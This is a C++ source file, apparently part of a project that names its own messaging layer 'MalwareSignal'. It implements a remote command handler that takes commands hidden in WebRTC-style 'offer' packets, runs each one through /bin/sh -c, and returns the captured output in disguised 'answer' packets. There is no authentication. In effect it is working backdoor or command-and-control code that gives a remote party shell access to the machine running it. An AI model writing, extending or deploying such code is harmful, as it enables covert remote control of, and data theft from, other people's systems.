//
// Created by darkglitch on 9/17/26.
//

#include "../../include/model/RemoteCommandHandler.h"
#include "../../include/model/MalwareSignal.h"
#include <nlohmann/json.hpp>

#include <chrono>
#include <csignal>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <random>
#include <sstream>
#include <sys/select.h>
#include <sys/wait.h>
#include <thread>
#include <unistd.h>

using json = nlohmann::json;

namespace {

std::string generateRequestId()
{
    static std::mt19937_64 rng{
        std::random_device{}()
    };

    std::stringstream ss;
    ss << std::hex << rng();
    return ss.str();
}

} // namespace


RemoteCommandHandler::RemoteCommandHandler(
    std::shared_ptr<MalwareSignal> signal
)
    : signal_(std::move(signal))
{
    if (signal_) {
        signal_->addHandler(
            [this](const std::string& message) {
                dispatchMessage(message);
            }
        );
    }
}


std::future<CommandResult>
RemoteCommandHandler::sendCommand(
    const std::string& target,
    const std::string& command,
    bool waitForResult,
    int timeoutSeconds
)
{
    if (command.empty()) {
        throw std::invalid_argument(
            "command must not be empty"
        );
    }

    const std::string requestId = generateRequestId();

    json payload = {
        {"type", "remote-command"},
        {"command", command},
        {"request_id", requestId}
    };

    json packet = {
        {"type", "offer"},
        {"target", target},
        {"sdp", payload.dump()}
    };

    std::future<CommandResult> future;

    if (waitForResult) {
        auto promise =
            std::make_shared<std::promise<CommandResult>>();

        future = promise->get_future();

        {
            std::lock_guard<std::mutex> lock(pendingMutex_);

            pendingResults_[requestId] = promise;
        }
    }

    if (!signal_->send(packet.dump())) {
        std::lock_guard<std::mutex> lock(pendingMutex_);

        pendingResults_.erase(requestId);

        throw std::runtime_error(
            "failed to send command request"
        );
    }

    if (!waitForResult) {
        std::promise<CommandResult> completed;
        auto result = completed.get_future();

        CommandResult r;
        r.requestId = requestId;
        r.status = "sent";

        completed.set_value(r);

        return result;
    }

    std::thread([this, requestId, timeoutSeconds] {
        std::this_thread::sleep_for(
            std::chrono::seconds(timeoutSeconds));

        std::shared_ptr<std::promise<CommandResult>> timedOut;
        {
            std::lock_guard<std::mutex> lock(pendingMutex_);
            const auto it = pendingResults_.find(requestId);
            if (it != pendingResults_.end()) {
                timedOut = it->second;
                pendingResults_.erase(it);
            }
        }
        if (timedOut) {
            CommandResult result;
            result.requestId = requestId;
            result.status = "error";
            result.error = "COMMAND TIMEOUT";
            timedOut->set_value(std::move(result));
        }
    }).detach();

    return future;
}


void RemoteCommandHandler::dispatchMessage(
    const std::string& message
)
{
    try {
        const json packet = json::parse(message);

        const std::string type =
            packet.value("type", "");

        if (type == "offer") {
            handleOffer(message);
        }
        else if (type == "answer") {
            handleAnswer(message);
        }
        else if (type == "remote-command") {
            processCommandRequest(
                packet.value("sender", ""),
                packet.value("command", ""),
                packet.value("request_id", "")
            );
        }
        else if (type == "remote-command-result") {
            CommandResult result;

            result.requestId =
                packet.value("request_id", "");

            result.status =
                packet.value("status", "");

            result.output =
                packet.value("output", "");

            result.error =
                packet.value("error", "");

            handleCommandResult(result);
        }
    }
    catch (const json::exception& e) {
        std::cerr
            << "Invalid JSON message: "
            << e.what()
            << '\n';
    }
}

void RemoteCommandHandler::handleOffer(
    const std::string& message
)
{
    try {
        const json packet = json::parse(message);

        if (!packet.contains("sdp") ||
            !packet["sdp"].is_string()) {
            return;
            }

        const json payload =
            json::parse(packet["sdp"].get<std::string>());

        if (payload.value("type", "") !=
            "remote-command") {
            return;
            }

        processCommandRequest(
            packet.value("sender", ""),
            payload.value("command", ""),
            payload.value("request_id", "")
        );
    }
    catch (const json::exception& e) {
        std::cerr
            << "Invalid offer: "
            << e.what()
            << '\n';
    }
}

void RemoteCommandHandler::handleAnswer(
    const std::string& message
)
{
    try {
        const json packet = json::parse(message);

        if (!packet.contains("sdp") ||
            !packet["sdp"].is_string()) {
            return;
            }

        const json payload =
            json::parse(packet["sdp"].get<std::string>());

        if (payload.value("type", "") !=
            "remote-command-result") {
            return;
            }

        CommandResult result;

        result.requestId =
            payload.value("request_id", "");

        result.status =
            payload.value("status", "");

        result.output =
            payload.value("output", "");

        result.error =
            payload.value("error", "");

        handleCommandResult(result);
    }
    catch (const json::exception& e) {
        std::cerr
            << "Invalid answer: "
            << e.what()
            << '\n';
    }
}

CommandResult RemoteCommandHandler::executeCommand(
    const std::string& command,
    const std::string& requestId
)
{
    CommandResult result;
    result.requestId = requestId;

    int outputPipe[2];
    if (pipe(outputPipe) != 0) {
        result.status = "error";
        result.error = std::strerror(errno);
        return result;
    }

    const pid_t child = fork();
    if (child < 0) {
        close(outputPipe[0]);
        close(outputPipe[1]);
        result.status = "error";
        result.error = std::strerror(errno);
        return result;
    }

    if (child == 0) {
        dup2(outputPipe[1], STDOUT_FILENO);
        dup2(outputPipe[1], STDERR_FILENO);
        close(outputPipe[0]);
        close(outputPipe[1]);
        execl("/bin/sh", "sh", "-c", command.c_str(), nullptr);
        _exit(127);
    }

    close(outputPipe[1]);
    std::string output;
    char buffer[4096];
    int status = 0;
    bool finished = false;
    const auto deadline =
        std::chrono::steady_clock::now() + std::chrono::seconds(120);

    while (!finished) {
        fd_set descriptors;
        FD_ZERO(&descriptors);
        FD_SET(outputPipe[0], &descriptors);
        timeval timeout{0, 100000};
        const int ready = select(outputPipe[0] + 1, &descriptors, nullptr, nullptr,
                                 &timeout);
        if (ready > 0 && FD_ISSET(outputPipe[0], &descriptors)) {
            const ssize_t count = read(outputPipe[0], buffer, sizeof(buffer));
            if (count > 0) {
                output.append(buffer, static_cast<std::size_t>(count));
            }
        }

        const pid_t waited = waitpid(child, &status, WNOHANG);
        if (waited == child) {
            finished = true;
        } else if (std::chrono::steady_clock::now() >= deadline) {
            kill(child, SIGKILL);
            waitpid(child, &status, 0);
            close(outputPipe[0]);
            result.status = "error";
            result.error = "COMMAND TIMEOUT";
            return result;
        }
    }

    while (const ssize_t count = read(outputPipe[0], buffer, sizeof(buffer))) {
        if (count > 0) {
            output.append(buffer, static_cast<std::size_t>(count));
        }
    }
    close(outputPipe[0]);

    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        result.status = "success";
        result.output = output.empty()
            ? "COMMAND EXECUTED SUCCESSFULLY"
            : output;
    } else {
        result.status = "error";
        result.error = output.empty() ? "COMMAND FAILED" : output;
    }
    return result;
}

void RemoteCommandHandler::processCommandRequest(
    const std::string& sender,
    const std::string& command,
    const std::string& requestId
)
{
    if (sender.empty() ||
        command.empty() ||
        requestId.empty()) {
        return;
        }

    std::cout
        << "Processing command request "
        << requestId
        << '\n';

    std::thread([this, sender, command, requestId] {
        const CommandResult result = executeCommand(command, requestId);
        sendResult(sender, result);
    }).detach();
}

void RemoteCommandHandler::handleCommandResult(
    const CommandResult& result
)
{
    std::shared_ptr<std::promise<CommandResult>> promise;

    {
        std::lock_guard<std::mutex> lock(pendingMutex_);

        auto it = pendingResults_.find(result.requestId);

        if (it == pendingResults_.end()) {
            return;
        }

        promise = it->second;
        pendingResults_.erase(it);
    }

    promise->set_value(result);
}

void RemoteCommandHandler::sendResult(
    const std::string& target,
    const CommandResult& result
)
{
    json payload = {
        {"type", "remote-command-result"},
        {"request_id", result.requestId},
        {"status", result.status}
    };

    if (!result.output.empty()) {
        payload["output"] = result.output;
    }

    if (!result.error.empty()) {
        payload["error"] = result.error;
    }

    json packet = {
        {"type", "answer"},
        {"target", target},
        {"sdp", payload.dump()}
    };

    signal_->send(packet.dump());
}
